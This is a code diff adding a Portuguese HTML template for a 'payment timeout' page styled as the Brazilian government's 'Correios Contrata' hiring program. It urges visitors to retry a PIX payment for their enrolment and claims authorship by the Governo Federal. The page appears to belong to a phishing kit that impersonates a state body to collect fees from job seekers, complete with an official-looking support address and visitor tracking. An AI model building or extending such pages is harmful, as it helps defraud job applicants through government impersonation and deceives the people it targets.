@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>{{ page_title or "Suporte - Correios Contrata - gov.br" }}</title>
+    
+    <!-- External CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+    <link href="https://fonts.cdnfonts.com/css/rawline" rel="stylesheet">
+    
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/custom.css') }}">
+    
+    <!-- SEO and Meta Tags -->
+    <meta name="description" content="Suporte - Programa Correios Contrata">
+    <meta name="keywords" content="correios, suporte, ajuda, pagamento">
+    <meta name="author" content="Governo Federal do Brasil">
+    
+    <!-- Microsoft Clarity -->
+    <script type="text/javascript">
+        (function(c,l,a,r,i,t,y){
+            c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+            t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+            y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+        })(window, document, "clarity", "script", "snb84erm98");
+    </script>
+    
+    <!-- Favicon -->
+    <link rel="icon" type="image/x-icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🇧🇷</text></svg>">
+</head>
+<body class="bg-white">
+    {% include 'base.html' %}
+    
+    <main class="container mx-auto px-4 py-8 max-w-4xl">
+        <!-- Support Header -->
+        <div class="text-center mb-8">
+            <div class="inline-flex items-center justify-center w-20 h-20 bg-orange-100 rounded-full mb-4">
+                <i class="fas fa-clock text-orange-600 text-3xl"></i>
+            </div>
+            <h1 class="text-2xl font-bold text-gray-800 mb-2">Tempo Limite Atingido</h1>
+            <p class="text-gray-600">O tempo para confirmação do pagamento expirou</p>
+        </div>
+
+        <!-- What Happened -->
+        <div class="bg-orange-50 border border-orange-200 rounded-lg p-6 mb-6">
+            <h2 class="text-xl font-semibold text-orange-800 mb-4">
+                <i class="fas fa-info-circle mr-2"></i>
+                O que aconteceu?
+            </h2>
+            <p class="text-orange-700 mb-4">
+                Aguardamos por 20 minutos a confirmação do seu pagamento PIX, mas não recebemos a confirmação automática.
+                Isso pode acontecer por diversos motivos:
+            </p>
+            <ul class="text-orange-700 space-y-2 list-disc list-inside">
+                <li>Demora no processamento do PIX pelo banco</li>
+                <li>Problemas temporários de conectividade</li>
+                <li>Pagamento ainda não foi efetuado</li>
+                <li>Falha na comunicação entre sistemas</li>
+            </ul>
+        </div>
+
+        <!-- Options -->
+        <div class="grid md:grid-cols-2 gap-6 mb-6">
+            <!-- If you paid -->
+            <div class="bg-green-50 border border-green-200 rounded-lg p-6">
+                <h3 class="font-semibold text-green-800 mb-3">
+                    <i class="fas fa-check-circle mr-2"></i>
+                    Se você já fez o pagamento
+                </h3>
+                <p class="text-green-700 text-sm mb-4">
+                    Se você confirmou o PIX no seu banco, aguarde algumas horas. 
+                    Enviaremos um email de confirmação quando o pagamento for processado.
+                </p>
+                <a href="{{ url_for('index') }}" 
+                   class="inline-block bg-green-600 text-white py-2 px-4 rounded font-medium hover:bg-green-700 transition-colors text-sm">
+                    <i class="fas fa-home mr-2"></i>
+                    Voltar ao Início
+                </a>
+            </div>
+
+            <!-- If you didn't pay -->
+            <div class="bg-blue-50 border border-blue-200 rounded-lg p-6">
+                <h3 class="font-semibold text-blue-800 mb-3">
+                    <i class="fas fa-redo mr-2"></i>
+                    Se você não fez o pagamento
+                </h3>
+                <p class="text-blue-700 text-sm mb-4">
+                    Você pode tentar novamente. Clique no botão abaixo para 
+                    gerar um novo PIX e continuar sua inscrição.
+                </p>
+                <a href="{{ url_for('pagamento_pix') }}" 
+                   class="inline-block bg-blue-600 text-white py-2 px-4 rounded font-medium hover:bg-blue-700 transition-colors text-sm">
+                    <i class="fas fa-credit-card mr-2"></i>
+                    Tentar Novamente
+                </a>
+            </div>
+        </div>
+
+        <!-- Contact Support -->
+        <div class="bg-gray-50 border border-gray-200 rounded-lg p-6 mb-6">
+            <h3 class="font-semibold text-gray-800 mb-3">
+                <i class="fas fa-headset mr-2"></i>
+                Precisa de Ajuda?
+            </h3>
+            <p class="text-gray-700 text-sm mb-4">
+                Se você tem dúvidas sobre o pagamento ou sua inscrição, entre em contato conosco:
+            </p>
+            
+            <div class="grid sm:grid-cols-2 gap-4">
+                <div class="text-sm">
+                    <div class="font-semibold text-gray-700 mb-2">
+                        <i class="fas fa-envelope mr-2 text-blue-600"></i>
+                        Email
+                    </div>
+                    <p class="text-gray-600">suporte@correios-contrata.gov.br</p>
+                </div>
+                
+                <div class="text-sm">
+                    <div class="font-semibold text-gray-700 mb-2">
+                        <i class="fas fa-phone mr-2 text-blue-600"></i>
+                        Telefone
+                    </div>
+                    <p class="text-gray-600">0800 123 4567</p>
+                    <p class="text-gray-500 text-xs">Segunda a sexta, 8h às 18h</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Important Info -->
+        <div class="bg-yellow-50 border border-yellow-200 rounded-lg p-6">
+            <h3 class="font-semibold text-yellow-800 mb-3">
+                <i class="fas fa-exclamation-triangle mr-2"></i>
+                Importante
+            </h3>
+            <ul class="text-yellow-700 text-sm space-y-2">
+                <li>• Não faça pagamentos duplicados</li>
+                <li>• Guarde o comprovante do PIX caso tenha feito o pagamento</li>
+                <li>• O prazo para inscrição continua válido</li>
+                <li>• Em caso de cobrança dupla, procure nosso suporte</li>
+            </ul>
+        </div>
+    </main>
+</body>
+</html>
